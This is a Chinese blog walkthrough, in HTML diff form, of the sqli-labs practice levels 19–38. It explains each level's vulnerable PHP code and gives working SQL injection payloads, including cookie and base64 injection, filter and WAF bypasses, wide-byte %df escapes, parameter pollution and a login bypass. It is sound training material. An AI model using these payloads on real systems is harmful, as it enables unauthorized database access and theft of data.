+<p><code>$uagent = $_SERVER[&#39;HTTP_REFERER&#39;];</code><br><code>$insert=&quot;INSERT INTO &#39;security&#39;.&#39;referers&#39; (&#39;referer&#39;, &#39;ip_address&#39;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)&quot;;</code><br><code>print_r(mysql_error());</code><br><code>echo &#39;Your User Agent is: &#39; .$uagent;</code><br>其他和lab18一样，只是uagent取值不同，这里取得是http_referer</p>
+</blockquote>
+<p>payload同lab18 只是位置不同而已！这次更改的位置在referer的位置</p>
+<h3 id="lab20之cookie-单引号"><a href="#lab20之cookie-单引号" class="headerlink" title="lab20之cookie+单引号"></a>lab20之cookie+单引号</h3><blockquote>
+<p>这道题不能纯贴代码，只能说他的过程</p>
+<ol>
+<li>  先判断<code>if(!isset($_COOKIE[&#39;uname&#39;]))</code></li>
+<li>  没有的话就设置cookie：<code>setcookie(&#39;uname&#39;, $row1[&#39;username&#39;]， time()+3600);</code>而<code>uname=$row1[&#39;username&#39;];</code>而row1=<code> $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</code>，这个里面的unmae和passwd都被过滤了，所以这里不存在过滤。设置完cookie之后重定向到<code>header (&#39;Location: index.php&#39;);</code></li>
+<li>  此时有了cookie，此时在判断cookie：有的话，在判断<code>if(!isset($_POST[&#39;submit&#39;]))</code>，因为要是重定向的话就没有这个参数，如果有的话，就<code>echo &quot; Your Cookie is deleted&quot;;</code>然后重置cookie再重定向<code>header (&#39;Location: index.php&#39;);</code></li>
+<li>  <strong>上面的每一步只是为了进入这一步</strong>：<code> $sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&quot;;</code>这里对cookee参数没有过滤，也就可以在重定向的这个界面修改cookie实现注入</li>
+</ol>
+</blockquote>
+<p>看到这个sql语句，就是最简单的lab1的题，注入方法相同，注入点不同而已</p>
+<ul>
+<li>  <code>die(&#39;Issue with your mysql: &#39; . mysql_error());</code> 所以可以基于报错<code>Cookie: uname=&#39;and updatexml(1,concat(0x7e,(select user()),0x7e),1)#</code></li>
+<li>  <code>echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];echo &#39;Your Password:&#39; .$row[&#39;password&#39;]echo &#39;Your ID:&#39; .$row[&#39;id&#39;];;</code>可以联合注入：<code>Cookie: uname=&#39;union select 1,2,user()#</code></li>
+<li>  当然最基础的布尔肯定可以啦：<code>Cookie: uname=admin&#39;and length(database())=8#</code></li>
+<li>  当然存在越权漏洞：<code>Cookie: uname=Dumb</code>可以访问任意一个用户的信息</li>
+</ul>
+<h3 id="less21之cookie-base64-单引号-括号"><a href="#less21之cookie-base64-单引号-括号" class="headerlink" title="less21之cookie+base64+单引号+括号"></a>less21之cookie+base64+单引号+括号</h3><blockquote>
+<p>和less20的区别在于<br><code>setcookie(&#39;uname&#39;, base64_encode($row1[&#39;username&#39;]), time()+3600);</code><br><code>$cookee = base64_decode($cookee);</code><br><code>$sql=&quot;SELECT * FROM users WHERE username=(&#39;$cookee&#39;) LIMIT 0,1&quot;;</code><br>即采取了base64加密以及单引号括号</p>
+</blockquote>
+<ul>
+<li><p>less20的payload单引号之后加上‘）’然后base64加密即可<br>  eg:”<code>&#39;)union select 1,2,user()#</code>–base64–&gt;<code>Jyl1bmlvbiBzZWxlY3QgMSwyLHVzZXIoKSM=</code></p>
+<h3 id="less22之cookie-base64-双引号"><a href="#less22之cookie-base64-双引号" class="headerlink" title="less22之cookie+base64+双引号"></a>less22之cookie+base64+双引号</h3><blockquote>
+<p>和less20的区别在于<br><code>setcookie(&#39;uname&#39;, base64_encode($row1[&#39;username&#39;]), time()+3600);</code><br><code>$cookee = base64_decode($cookee);</code><br><code>$cookee1 = &#39;&quot;&#39;. $cookee. &#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</code><br>即采取了base64加密和双引号</p>
+</blockquote>
+</li>
+<li><p>less20的payload单引号改成双引号然后base64加密即可<br>  eg:<code>&quot;union select 1,2,user()#</code>–base64—&gt;<code>InVuaW9uIHNlbGVjdCAxLDIsdXNlcigpIw==</code></p>
+</li>
+</ul>
+<h1 id="Advanced-Injection"><a href="#Advanced-Injection" class="headerlink" title="Advanced Injection"></a>Advanced Injection</h1><blockquote>
+<p>Advanced SQL Injection is a presentation geared toward showing security professionals advanced exploitation techniques for situations when you must prove to the customer the extent of compromise that is possible. This updated presentation will cover the following key concepts: IDS Evasion &amp; Web Application Firewall Bypass, Privilege Escalation, Re-Enabling stored procedures, Obtaining an interactive command-shell, Data Exfiltration via DNS.<br>高级SQL注入是一种演示，旨在向安全专业人员展示高级开发技术，以便在必须向客户证明可能的妥协程度时。此更新的演示文稿将涵盖以下主要概念：IDS规避和Web应用程序防火墙绕过，权限提升，重新启用存储过程，获取交互式命令shell，通过DNS进行数据泄漏。</p>
+</blockquote>
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="less24之二次注入"><a href="#less24之二次注入" class="headerlink" title="less24之二次注入"></a>less24之二次注入</h3><blockquote>
+<p>分好几个页面，代码量有点大，可见我下图的分析，当然为了更加熟悉了解过程，推荐你自己分析一次<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90less24%E5%90%8E%E7%BB%AD.png" srcset="/img/loading.gif" lazyload alt="a"><br>分析过程中弄清楚了几个理念</p>
+<ol>
+<li> include和header()，include是把代码包含进来，页面还是当前页面。而header是重定向，此时就可以进行burp的拦截以及参数修改</li>
+<li> $_session[xxx]和post get参数不同！这个是存在目标服务器上的，通过用户的pgpsession来区别用户，里面的xxx参数是不可能通过burp拦截并复制的</li>
+<li> 对转义符号更深的了解：select * from users where id=’1/‘’；这个语句没有语法错误，因为/‘实体化了，不会与前面的’闭合。但是查询的时候还是以1’这个作为id的整体进行查询！<br>此处的漏洞就如图和上面的第三点的理念有关系。uersname创建的时候以admin’#为一个整体存入，然后查询的时候，没有对这种脏数据进行再次转义导致的二次注入</li>
+</ol>
+</blockquote>
+<h2 id="简单的参数过滤"><a href="#简单的参数过滤" class="headerlink" title="简单的参数过滤"></a>简单的参数过滤</h2><p>注释符号，andor，转义符号，union select的过滤</p>
+<h3 id="less23之过滤注释符号（–-）"><a href="#less23之过滤注释符号（–-）" class="headerlink" title="less23之过滤注释符号（– #）"></a>less23之过滤注释符号（– #）</h3><blockquote>
+<p><code>$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;</code>//分别给reg reg1 replace赋值<br><code>$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);</code>//分别用reg reg1去匹配过滤<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br><code>print_r(mysql_error());</code></p>
+</blockquote>
+<p>前面的引号做前面的闭合，后面的引号此时不能注释掉，就也构造闭合即可</p>
+<ul>
+<li>  联合注入：<code>?id=&#39; union select 1,user(),&#39;3</code> （前面必须为假，因为有个limit 0,1）</li>
+<li>  基于报错：<code>?id=1&#39;and updatexml(1,concat(0x7e,user(),0x7e),1) and &#39;1</code></li>
+<li>  基于boolen：<code>?id=1&#39;and 1 and&#39;1</code></li>
+<li>  基于时间：<code>?id=1&#39;and if(1,sleep(5),1)and &#39;1</code><blockquote>
+<p>/*单独写，不闭合的sql语句必定报错，不要问为什么，就是必须闭合！此路不通！闭合就两种–+和#，/<em>仅在一种情况下可用与和，但是也是和</em>/闭合的情况下</p>
+</blockquote>
+<h3 id="less25之过滤逻辑运算（and-or）"><a href="#less25之过滤逻辑运算（and-or）" class="headerlink" title="less25之过滤逻辑运算（and or）"></a>less25之过滤逻辑运算（and or）</h3><blockquote>
+<p><code>$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);</code><br><code>$id= preg_replace(&#39;/AND/i&#39;,&quot;&quot;, $id);</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br><code>print_r(mysql_error());</code>//可以基于报错</p>
+</blockquote>
+</li>
+</ul>
+<p>通用绕过思路：</p>
+<ol>
+<li> <del>大小写变形 Or,OR,oR</del>此处不存在大小写变形，因为<code>i</code>作为模式修正符，使得正则表达式不区分大小写，但是其他地方也许可以</li>
+<li><del>编码,hex,urlencode</del>and or 本来就是url关键字 编码不了！ hex转码的话，服务器端并不会解码，所以and无法还原，也就失效</li>
+<li><del>采用注释/ * or */的方法</del>此处内敛注释 /* or*/也不行，因为正则匹配正好匹配。但是也许其他地方可以</li>
+<li>利用符号 and====&gt;&amp;&amp; or===&gt;||然后搭配之前的明注入，联合，error，盲注都可以</li>
+<li>异或运算 1^1=0 1^0=1  1^1^1=1  1^0^1=0</li>
+<li>双写绕过 anandd 因为他的preg_replace并没有循环进行去除</li>
+</ol>
+<h3 id="less25a之过滤逻辑运算-盲注"><a href="#less25a之过滤逻辑运算-盲注" class="headerlink" title="less25a之过滤逻辑运算_盲注"></a>less25a之过滤逻辑运算_盲注</h3><blockquote>
+<p>和less25区别在于注释掉了<code>print_r(mysql_error());</code></p>
+</blockquote>
+<ul>
+<li>  无非把less25的注入payload 只能盲注而已</li>
+</ul>
+<h3 id="less26之过滤逻辑运算-过滤注释符-过滤转义符"><a href="#less26之过滤逻辑运算-过滤注释符-过滤转义符" class="headerlink" title="less26之过滤逻辑运算+过滤注释符+过滤转义符"></a>less26之过滤逻辑运算+过滤注释符+过滤转义符</h3><blockquote>
+<p><code>$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);</code>//去掉or<br><code>$id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);</code>//去掉and<br><code>$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);</code>//去掉/<em>，过滤掉了/</em> 自然就没有办法使用/*<br><code>$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);</code>    //去掉–<br><code>$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);</code>    //去掉#<br><code>$id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);</code>    //去掉空格<br><code>$id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);</code> //去掉转义符号\和/</p>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br><code>print_r(mysql_error());</code>//可以基于报错</p>
+</blockquote>
+<ul>
+<li>  没有循环执行匹配去除，因此可以双写绕过</li>
+<li>  基于空白符/s的过滤，后面经过fuzzer测试，ubuntu下只有%a0能够绕过基于/s的正则过滤</li>
+<li>  综上两种方法绕过，可以搭配之前的明注、联合、error、盲注</li>
+</ul>
+<p><strong>补充</strong></p>
+<ol>
+<li> <code>[\/\\\\]</code>是什么语法？<br>PHP代码在运行的时候，所有使用转移符号的的PHP常变量都会被解析一次，字符串如果是一个正则表达式，交给正则引擎又会被解析一次。<br>代码 <code>preg_replace(&quot;/[\/\\\\]/&quot;,&#39;&#39;,$id) </code>中的表达式 <code>&quot;/[\/\\]/&quot; </code>经过PHP编译引擎后，得到的是 <code>&quot;/[\/\\]/&quot; </code>，因为] 符号在PHP引擎中是不需要转义的，所以 \ 符号原样输出。当 <code>&quot;/[\/\\]/&quot;</code> 进入正则引擎的时候，解析得到 <code>/[/\]/</code>即匹配\或者/<br><a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/457282811.html">传送门</a></li>
+<li> 追问：那为什么那一开始的/\中用/转义的\，在最开始的php引擎中没有被转义？而//却被转义？<br>在字符串里，你用哪个引号作为最外围的包围符号，那么\只能转义这个引号和\ <a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/1924020732731650587.html">传送门</a></li>
+</ol>
+<p>综上，这个是匹配任意的\或者/ 然后去掉<br><strong>补充</strong><br>有趣的故事<br>我分别尝试了<code>1\\\\\</code>和<code>1//////</code>最后得到的结果都是1</p>
+<ol>
+<li>  1///////，可以观察watch窗口的id的变化值，在执行到<code>$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);</code>语句的时候，他就被置为1了<br>这里我可以理解为虽然转义为了/*，但是底层可以分为两套方案识别他 既可以匹配/<em>，也可以按照</em>来匹配任意个字符一样匹配/，从而导致了这里的变化<img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/a.gif" srcset="/img/loading.gif" lazyload/></li>
+<li>  <code>1\\\\\\\</code>，继续看id的值，发现在执行<code>$id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);</code>会变为 1，因为我这里任意个\都会被剔除，这个暂时没想到好的办法解释…魔性！<img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/b.gif" srcset="/img/loading.gif" lazyload/></li>
+</ol>
+<p>反正就是重复上面的，任意个\或者/都会被剔除，即使是<code>id=1\\iia\\\//\\</code>这个杂序也会变成1iia</p>
+<h3 id="less26a之过滤逻辑运算-过滤注释符-过滤转义符-盲注"><a href="#less26a之过滤逻辑运算-过滤注释符-过滤转义符-盲注" class="headerlink" title="less26a之过滤逻辑运算+过滤注释符+过滤转义符_盲注"></a>less26a之过滤逻辑运算+过滤注释符+过滤转义符_盲注</h3><blockquote>
+<p>和less26区别在于注释掉了<code>print_r(mysql_error());</code></p>
+</blockquote>
+<ul>
+<li><p>  无非把less26的注入payload 只能盲注而已</p>
+<h3 id="less27之过滤select-union-注释符"><a href="#less27之过滤select-union-注释符" class="headerlink" title="less27之过滤select+union+注释符"></a>less27之过滤select+union+注释符</h3><blockquote>
+<p><code>$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);</code>        //过滤/*<br><code>$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);</code>        //过滤 –.<br><code>$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);</code>        //过滤 #.<br><code>$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);</code>        //过滤 spaces.<br><code>$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);</code>        //过滤 spaces.<br><code>$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);</code>        //过滤 spaces.<br><code>$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);</code>        //过滤 union<br><code>$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);</code>        //过滤 select<br><code>$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);</code>        //过滤 UNION<br><code>$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);</code>        //过滤 SELECT<br><code>$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);</code>        //过滤 Union<br><code>$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);</code>        //过滤 select<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
+</blockquote>
+</li>
+<li><p>  因为这里不是用\s来匹配空白字符，就自己再次fuzzer了一波：%09，%0a,%0b,%0c,%0d.%a0都可以成功绕过<code>preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id)</code>这个正则</p>
+</li>
+<li><p>本质上这里的模式修正符号没有什么卵用，因此存在seLect这种异形能注入<br>  m：多行匹配，但是这里没有^ $来指定开头和结尾<br>  s：使得.能够匹配换行符，但是这里没有.的匹配<br>  除非i 进行无视大小写这种修正符</p>
+</li>
+<li><p>  根据他的过滤次数，可以考虑selecselecselecttt，三重写select 过滤掉两重剩下一重依然注入，union双写即可，其他类似</p>
+</li>
+<li><p>  and和or也没有被过滤啊 更简单啦！</p>
+</li>
+</ul>
+<p><strong>错误的想法</strong></p>
+<ul>
+<li><p>  以为可以<code>select * from users where id=&#39;1&#39;union(select 1,2,&#39;3&#39;);</code>这种加个括号解决的方法，但是忽略了要在闭合3的引号之后再加上括号，但是这里<code>select * from users where id=&#39;1&#39;union(select 1,2,&#39;3）&#39;;</code>成为了这种 必然报错啦</p>
+</li>
+<li><p>  <code>$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);</code>经过对这个的fuzzer测试，发现只有字符串里面有空格或者+号，重复出现或者交替出现，或者在字符串多处出现都会被去掉，和less26差不多的魔性，比如<code>?id=1+ asd  +a+   as1+1</code>===&gt;<code>1asdaas11</code></p>
+<h3 id="less27a之过滤select-union-注释-盲注"><a href="#less27a之过滤select-union-注释-盲注" class="headerlink" title="less27a之过滤select+union+注释_盲注"></a>less27a之过滤select+union+注释_盲注</h3><blockquote>
+<p>和less27区别在于注释掉了<code>print_r(mysql_error());</code></p>
+</blockquote>
+</li>
+<li><p>  无非把less27的注入payload 只能盲注而已</p>
+</li>
+</ul>
+<h3 id="less28之过滤select-union-注释符（二）"><a href="#less28之过滤select-union-注释符（二）" class="headerlink" title="less28之过滤select+union+注释符（二）"></a>less28之过滤select+union+注释符（二）</h3><blockquote>
+<p><code>$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);</code>//过滤 /*<br><code>$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);</code>//过滤 –.<br><code>$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);</code>//过滤 #.<br><code>$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);</code>//过滤空格<br><code>$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);</code>//最核心的过滤语句<br><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code>//采用（’‘）的形式</p>
+</blockquote>
+<ul>
+<li>由于union和select之间有个/s，但是%a0刚刚好不在这个范畴之类，于是构造<code>?id=1&#39;)union%a0select%a01,2,(&#39;4</code>利用成功。<ul>
+<li>  <del>%0b也测试成功</del>%0b不放在union select之间，放在其他位置可以测试成功，但是放在这之间不行。因为/s能绕过的只有%a0**，其他地方空格的匹配模式是<code>/[ +]/</code>！！！！！</li>
+</ul>
+</li>
+</ul>
+<h3 id="less28a之过滤select-union-注释符-盲注（二）"><a href="#less28a之过滤select-union-注释符-盲注（二）" class="headerlink" title="less28a之过滤select+union+注释符_盲注（二）"></a>less28a之过滤select+union+注释符_盲注（二）</h3><blockquote>
+<p>只保留了一个黑名单<code>id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);</code><br>同时注释掉了报错而已</p>
+</blockquote>
+<ul>
+<li>  无非把less28的注入payload 只能盲注而已</li>
+</ul>
+<h2 id="HPP（http-parameter-pollution）"><a href="#HPP（http-parameter-pollution）" class="headerlink" title="HPP（http parameter pollution）"></a>HPP（http parameter pollution）</h2><h3 id="less29之初探HPP"><a href="#less29之初探HPP" class="headerlink" title="less29之初探HPP"></a>less29之初探HPP</h3><p>最好的waf?我不看源码分析，直接上手撸！</p>
+<ul>
+<li>  <code>?id=1&#39;and if(1,1,sleep(5)) and &#39;1</code></li>
+<li>  <code>?id=1&#39;and updatexml(1,concat(0x7e,user(),0x7e),1)and &#39;1</code></li>
+<li>  <code>?id=1&#39;and length(database())=8 and &#39;1</code></li>
+<li>  <code>?id=2&#39;and 1--+</code></li>
+<li>  <code>?id=1&#39; union select 1,1,2--+</code></li>
+</ul>
+<p>我曹，怎么都能过？说好的世界最好的waf?</p>
+<p>不行，得看看源码再看下index.php的代码？excuse？什么鬼啊！！！说好的waf?</p>
+<blockquote>
+<p>百度了一波！要装tomcat，来模拟waf。（我们往往在tomcat服务器处做数据过滤和处理，使其功能类似为一个 WAF，然后再将waf过滤后的参数传递给Apache服务器。就类似与我们客户端与Apache服务器进行数据交换的过程中，经过了tomcat这一层代理，而这一层代理会对我们提交的参数进行过滤）<br>利用原理是HPP（http parameter pollution）：填写两个id，分别赋予不同的值，前者赋予正常的值，后者则是我们sql注入语句。tomcat默认获得前一个id的值然后进行过滤，而Apache默认get后面的id的值。<br>但是我们没有tomcat，怎么办呢？<br>sql-labs作者很高明，为了满足没有装tomcat的我们，做了一个login.php，可以模拟这个过程。同时可以观察它模拟的这个过程中使用的函数，进一步让我们理解tomcat和Apache交互过程，进而了解HPP。<br>下面是我分析的函数执行过程，和二次注入一样，自己分析有助于加强对漏洞的理解<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190607104002.png" srcset="/img/loading.gif" lazyload alt="20190607104002.png"></p>
+</blockquote>
+<p>所以接下来的绕过就很简单，前面id是正常的，后面id赋值的话就把前面的姿势都用一次即可！</p>
+<ul>
+<li>  <code>Less-29/login.php?id=1&amp;id=&#39;union select 1,user(),&#39;2</code></li>
+</ul>
+<h3 id="less30之再探"><a href="#less30之再探" class="headerlink" title="less30之再探"></a>less30之再探</h3><blockquote>
+<p><code>$id = &#39;&quot;&#39; .$id. &#39;&quot;&#39;;</code>多了这一层</p>
+</blockquote>
+<p>easy</p>
+<h3 id="less31之三探"><a href="#less31之三探" class="headerlink" title="less31之三探"></a>less31之三探</h3><blockquote>
+<p><code>$id = &#39;&quot;&#39; .$id. &#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<p>easy</p>
+<h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><blockquote>
+<p>仅针对：GBK编码的数据库+addslashes处理过的数据 绕过</p>
+</blockquote>
+<h3 id="less32之自定义addslashes（）函数"><a href="#less32之自定义addslashes（）函数" class="headerlink" title="less32之自定义addslashes（）函数"></a>less32之自定义addslashes（）函数</h3><blockquote>
+<p><code>function check_addslashes($string)</code><br><code>       $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);</code><br><code>       $string = preg_replace(&#39;/\&#39;/i&#39;, &#39;\\\&#39;&#39;, $string);</code><br><code>      $string = preg_replace(&#39;/\&quot;/&#39;, &quot;\\\&quot;&quot;, $string);</code><br><code>return $string;</code><br>使用上述函数来模拟addslashes函数的过程</p>
+<blockquote>
+<p>preg_quote函数的作用使他里面的东西保持原来的样子，比如这里因为有特殊字符\，所以无法正常匹配到\ \，只能匹配到,而使用了这个函数就相当于/\ \ \ /，帮你转义了，使你可以正常匹配到你想要的字符串，即使它里面含有特殊字符<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhanai/p/6868219.html">传送门</a><br>但是在这里很神奇，这个函数处理过程在我debug之后发现，无论你输入多少个\，他都能转义，比如输入5个\，转义出来的结果为10个\，3个则对应6个\</p>
+</blockquote>
+</blockquote>
+<ul>
+<li><p>他没过滤掉注释符，所以可以随便注入，前提只要用%df逃逸掉‘从而闭合掉前面的’即可<br>   <code>?id=-1%df%27union%20select%201,user(),3--+</code></p>
+<h3 id="less33之调用addslashes-函数处理——GET"><a href="#less33之调用addslashes-函数处理——GET" class="headerlink" title="less33之调用addslashes()函数处理——GET"></a>less33之调用addslashes()函数处理——GET</h3><p><code> $id=check_addslashes($_GET[&#39;id&#39;]);</code> //对应的check_addslashes就是调用addslashes函数而已</p>
+</li>
+<li><p>  同上<code>?id=-1%df%27union%20select%201,user(),3--+</code></p>
+<h3 id="less34之调用addslashes-函数处理——POST"><a href="#less34之调用addslashes-函数处理——POST" class="headerlink" title="less34之调用addslashes()函数处理——POST"></a>less34之调用addslashes()函数处理——POST</h3><blockquote>
+<p><code>    $uname1=$_POST[&#39;uname&#39;];</code><br><code>$passwd1=$_POST[&#39;passwd&#39;];</code><br><code> $uname = addslashes($uname1);</code><br><code>$passwd= addslashes($passwd1);</code><br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;</code></p>
+</blockquote>
+</li>
+</ul>
+<p>%df的字符又无法表示，怎么办呢？直接burp改即可</p>
+<ul>
+<li>  <code>uname=%df%27or+1%23&amp;passwd=a&amp;submit=Submit</code></li>
+</ul>
+<p><strong>补充</strong><br>此处以post提交表单，此时就没有编码了，那我如何构造%df这种特殊字符？<br>我直接在页面的输入框框里面填？直接填<code>%df&#39; or 1 #</code>会怎么样？</p>
+<blockquote>
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190607181111.png" srcset="/img/loading.gif" lazyload alt="20190607181111.png"></p>
+</blockquote>
+<p>从上图可知，很明显不行,无法注入<br>具体为啥在输入框填写的参数到html包里进行一次编码了的原因暂时未知（%25===&gt;%）<br><strong>补充</strong><br>《mysql注入天书》less34里面提到“utf-8 转换为 utf-16 或 utf-32,例如将 ‘ 转为 utf-16 为<code> � &#39;</code>，以及对应的万能密码<code>� &#39; or 1=1#</code>，目前在我的环境下无法复现，因为我赋值粘贴的时候可能因为编码的原因，用burp拦截包的post的body的uname对于的值为<code>%EF%BF%BD+%27+or+1%3D1%23</code>，很明显不行<br>我也尝试过用Python：<code>print &quot;&#39;&quot;.encode(&quot;utf16&quot;)</code>也是上面的问题<br>网上也没有找到utf8 utf16互相转换的工具<br>因此还是直接burp改包算了，毕竟找到字符表示也存在上述复制粘贴的编码问题</p>
+<h3 id="less35之调用addslashes-函数处理-int形注入"><a href="#less35之调用addslashes-函数处理-int形注入" class="headerlink" title="less35之调用addslashes()函数处理+int形注入"></a>less35之调用addslashes()函数处理+int形注入</h3><p><code>$id=addslashes($_GET[&#39;id&#39;]);</code><br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
+<p>此时就是int形注入了，都不需要引号了，此时的addslashes函数形同虚设</p>
+<ul>
+<li>  ？id=1 and 1<h3 id="less36之mysql-real-escape-string——GET"><a href="#less36之mysql-real-escape-string——GET" class="headerlink" title="less36之mysql_real_escape_string——GET"></a>less36之mysql_real_escape_string——GET</h3><code>$id= mysql_real_escape_string($id); </code><br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></li>
+</ul>
+<p>mysql_real_escape_string()前指定mysql连接字符集，如果是GBK的，必须使用<strong>mysql_set_charset</strong>(‘GBK’)设置才安全，而这里仅仅只是<code>SET NAMES gbk</code>，所以还是存在宽字节绕过问题</p>
+<ul>
+<li>  <code>?id=%df%27or%201%23</code><h4 id="less37之mysql-real-escape-string——POST"><a href="#less37之mysql-real-escape-string——POST" class="headerlink" title="less37之mysql_real_escape_string——POST"></a>less37之mysql_real_escape_string——POST</h4><code> $uname = mysql_real_escape_string($uname1);</code><br><code>$passwd= mysql_real_escape_string($passwd1);</code><br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;</code></li>
+</ul>
+<p>同36的问题，没有用mysql_set_charset(“GBK”)</p>
+<blockquote>
+<p>解题思路同less35，burp拦截 然后改下参数即可</p>
+</blockquote>
+<h1 id="Stacked-injections"><a href="#Stacked-injections" class="headerlink" title="Stacked injections"></a>Stacked injections</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p><strong>首先声明：这里的环境不能实现select 。只能说是堆叠以增删改信息，不能查</strong><br>下面是我的探索过程<br>1    .查看了下源代码，发现<br>     <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611165611.png" srcset="/img/loading.gif" lazyload alt="20190611165611.png"><br>2.   发现了mysqli_multi_query函数<br>     <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190610222136.png" srcset="/img/loading.gif" lazyload alt="20190610222136.png"><br>3.   因为他只能显示一个结果集,同时如果第一个 SQL 语句就失败了，返回 FALSE。 如果是批量执行 SQL 语句， 必须首先调用 mysqli_next_result() 函数，才可以获取后续语句的错误信息。<br>4.   根据<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mysqli.multi-query.php">官方文档</a>：可以发现他的源代码就是官方文档上面抄的demo，只是去掉了do-while循环，导致无法进一步查询<br>     于是我尝试用下面范例里面的do while改写<br>     <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190610222443.png" srcset="/img/loading.gif" lazyload alt="20190610222443.png"><br>5.   修改之后在执行堆叠查询，使得他可以显示多个结果<br>     <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190610222421.png" srcset="/img/loading.gif" lazyload alt="20190610222421.png"><br>6.   当然这个不能使用set prepare语句，毕竟你无论先set还是直接prepare，都会导致该语句执行结果为空集，从而导致mysqli_next_result返回结果为false，进而根据循环而退出<br>     <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190610222705.png" srcset="/img/loading.gif" lazyload alt="20190610222705.png"><br><strong>综上</strong>:这里的环境有如下几个限制</p>
+<ol>
+<li>  只会显示第一次查询的结果，因此这里只能增删改的方法注入</li>
+<li>  改了源代码，可以显示多次执行结果，但是也无法实现PDO语句查询</li>
+</ol>
+<h3 id="less38之单引号"><a href="#less38之单引号" class="headerlink" title="less38之单引号"></a>less38之单引号</h3><blockquote>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
+</blockquote>
+<ul>
+<li>  因为是上面的语句，我使用不堆叠注入都可以成功：<code>?id=&#39; union select 1,2,3;--+</code>，进而可以把前面可以利用的一把梭，当然包括报错注入</li>
